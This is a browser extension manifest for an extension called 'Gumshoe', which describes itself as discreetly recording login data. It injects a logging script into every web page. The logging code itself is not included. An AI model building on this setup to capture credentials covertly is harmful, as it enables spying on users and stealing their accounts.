{
	"manifest_version": 2,
	"name": "Gumshoe",
	"version": "2.1",
	"description": "Discreetly records login data to local storage.",
	"icons": {
		"128": "img/icon128.png",
		"48": "img/icon48.png"
	},
	"permissions": [
		"tabs",
		"storage"
	],
	"background": {
		"scripts": ["js/background.js"]
	},
	"content_scripts": [
		{
			"matches": ["<all_urls>"],
			"js": ["js/log.js"]
		}
	]
}

